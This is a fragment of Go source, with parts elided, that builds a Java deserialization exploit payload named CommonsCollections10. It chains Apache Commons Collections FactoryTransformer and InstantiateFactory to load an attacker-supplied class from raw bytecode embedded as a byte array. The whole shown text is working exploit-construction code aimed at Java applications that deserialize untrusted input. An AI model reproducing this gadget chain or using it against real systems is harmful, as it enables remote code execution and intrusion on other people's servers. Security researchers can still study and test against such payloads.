...
func CommonsCollections10(bytecodes []byte) []byte {
	return ClassObject{
					...
					{"Ljava/util/Map;", "map", ClassObject{
						...
						fields: []Field{
							{"Lorg/apache/commons/collections/Transformer;", "factory", ClassObject{
								name:             "org.apache.commons.collections.functors.FactoryTransformer",
								serialVersionUID: -6817674502475353160,
								classDescFlags:   SC_SERIALIZABLE,
								fields: []Field{
									{"Lorg/apache/commons/collections/Factory;", "iFactory", ClassObject{
										name:             "org.apache.commons.collections.functors.InstantiateFactory",
										serialVersionUID: -7732226881069447957,
										classDescFlags:   SC_SERIALIZABLE,
										fields: []Field{
															...
															{"[[B", "_bytecodes", ArrayObject{
																...
																values: interfaces(
																	...
																	ArrayObject{
																		...
																		classDescFlags:   SC_SERIALIZABLE,
																		values: interfaces(
																			byte(0xca), byte(0xfe), byte(0xba), byte(0xbe), byte(0x00), byte(0x33), byte(0x00), byte(0x11), byte(0x01), byte(0x00), byte(0x2e), byte(0x6f), byte(0x72), byte(0x67), byte(0x2f), byte(0x61), byte(0x70), byte(0x61), byte(0x63), byte(0x68), byte(0x65), byte(0x2f), byte(0x63), byte(0x6f), byte(0x6d), byte(0x6f), byte(0x6e), byte(0x73), byte(0x2f), byte(0x78), byte(0x6d), byte(0x6c), byte(0x2f), byte(0x73), byte(0x65), byte(0x72), byte(0x69), byte(0x61), byte(0x6c), byte(0x69), byte(0x7a), byte(0x65), byte(0x72), byte(0x2f), byte(0x54), byte(0x6f), byte(0x54), byte(0x65), byte(0x78), byte(0x74), byte(0x53), byte(0x74), byte(0x72), byte(0x65), byte(0x61), byte(0x6d), byte(0x07), byte(0x00), byte(0x01), byte(0x00), byte(0x10), byte(0x6a), byte(0x61), byte(0x76), byte(0x61), byte(0x2f), byte(0x6c), byte(0x61), byte(0x6e), byte(0x67), byte(0x2f), byte(0x4f), byte(0x62), byte(0x6a), byte(0x65), byte(0x63), byte(0x74), byte(0x07), byte(0x00), byte(0x03), byte(0x01), byte(0x00), byte(0x0a), byte(0x53), byte(0x6f), byte(0x75), byte(0x72), byte(0x63), byte(0x65), byte(0x46), byte(0x69), byte(0x6c), byte(0x65), byte(0x01), byte(0x00), byte(0x11), byte(0x54), byte(0x6f), byte(0x54), byte(0x65), byte(0x78), byte(0x74), byte(0x53), byte(0x74), byte(0x72), byte(0x65), byte(0x61), byte(0x6d), byte(0x2e), byte(0x6a), byte(0x61), byte(0x76), byte(0x61), byte(0x01), byte(0x00), byte(0x10), byte(0x73), byte(0x65), byte(0x72), byte(0x69), byte(0x61), byte(0x6c), byte(0x56), byte(0x65), byte(0x72), byte(0x73), byte(0x69), byte(0x6f), byte(0x6e), byte(0x55), byte(0x49), byte(0x44), byte(0x01), byte(0x00), byte(0x01), byte(0x4a), byte(0x05), byte(0x71), byte(0xe6), byte(0x69), byte(0xee), byte(0x3c), byte(0x6d), byte(0x47), byte(0x18), byte(0x01), byte(0x00), byte(0x0d), byte(0x43), byte(0x6f), byte(0x6e), byte(0x73), byte(0x74), byte(0x61), byte(0x6e), byte(0x74), byte(0x56), byte(0x61), byte(0x6c), byte(0x75), byte(0x65), byte(0x01), byte(0x00), byte(0x06), byte(0x3c), byte(0x69), byte(0x6e), byte(0x69), byte(0x74), byte(0x3e), byte(0x01), byte(0x00), byte(0x03), byte(0x28), byte(0x29), byte(0x56), byte(0x0c), byte(0x00), byte(0x0c), byte(0x00), byte(0x0d), byte(0x0a), byte(0x00), byte(0x04), byte(0x00), byte(0x0e), byte(0x01), byte(0x00), byte(0x04), byte(0x43), byte(0x6f), byte(0x64), byte(0x65), byte(0x00), byte(0x21), byte(0x00), byte(0x02), byte(0x00), byte(0x04), byte(0x00), byte(0x01), byte(0x00), byte(0x1a), byte(0x00), byte(0x07), byte(0x00), byte(0x08), byte(0x00), byte(0x01), byte(0x00), byte(0x0b), byte(0x00), byte(0x02), byte(0x00), byte(0x09), byte(0x00), byte(0x01), byte(0x00), byte(0x01), byte(0x00), byte(0x0c), byte(0x00), byte(0x0d), byte(0x00), byte(0x01), byte(0x00), byte(0x10), byte(0x00), byte(0x11), byte(0x00), byte(0x01), byte(0x00), byte(0x01), byte(0x00), byte(0x05), byte(0x2a), byte(0xb7), byte(0x00), byte(0x0f), byte(0xb1), byte(0x00), byte(0x01), byte(0x00), byte(0x05), byte(0x00), byte(0x02), byte(0x00), byte(0x06),
																		),
																	},
																),
															}},
															{Array, "_class", nil},
															{"Ljava/lang/String;", "_name", "QSFVPLBF"},
											...
											{"Ljava/lang/Class;", "iClassToInstantiate", ClassObject{
